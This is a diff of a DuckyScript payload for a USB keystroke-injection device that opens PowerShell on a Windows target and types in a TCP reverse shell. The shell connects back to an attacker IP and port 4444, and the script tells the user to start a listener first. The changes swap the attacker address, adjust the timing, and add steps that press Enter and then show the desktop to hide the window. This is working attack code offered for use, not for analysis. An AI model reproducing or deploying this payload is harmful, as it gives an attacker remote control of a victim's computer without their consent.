@@ -13,13 +13,15 @@ REM DON'T FORGET TO START LISTENER BEFORE DEPLOYING ON TARGET
 REM ===========================================================
 REM REQUIRED: Define the attackers IP & Port    -- EDIT THIS
 REM ===========================================================
-DEFINE ADDRESS '10.193.89.227'
+DEFINE ADDRESS '10.169.208.227'
 DEFINE PORT 4444
 
 REM Extension DETECT_READY by Korben for best and fastest deployment
 EXTENSION DETECT_READY
+    REM VERSION 1.1
+    REM AUTHOR: Korben
 
-    REM_BLOCK === DOCUMENTATION ===
+    REM_BLOCK DOCUMENTATION
         USAGE:
             Extension runs inline (here)
             Place at beginning of payload (besides ATTACKMODE) to act as dynamic
@@ -30,8 +32,8 @@ EXTENSION DETECT_READY
             Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
     END_REM
 
-    REM === CONFIGURATION ===
-    DEFINE #RESPONSE_DELAY 500
+    REM CONFIGURATION:
+    DEFINE #RESPONSE_DELAY 25
     DEFINE #ITERATION_LIMIT 120
 
     VAR $C = 0
@@ -42,6 +44,7 @@ EXTENSION DETECT_READY
     END_WHILE
     CAPSLOCK
 END_EXTENSION
+
 
 
 REM === Variables for pseudo randomizing ===
@@ -59,7 +62,7 @@ DELAY 1500
 GUI r
 DELAY 500
 STRINGLN powershell
-DELAY 500
+DELAY 2000
 
 REM === Craft the TCP Reverse Shell ===
 STRING $
@@ -115,3 +118,6 @@ STRING .Flush()};$
 INJECT_VAR $var_gibb3rish
 DELAY 100
 CAPSLOCK
+ENTER
+DELAY 100
+GUI d
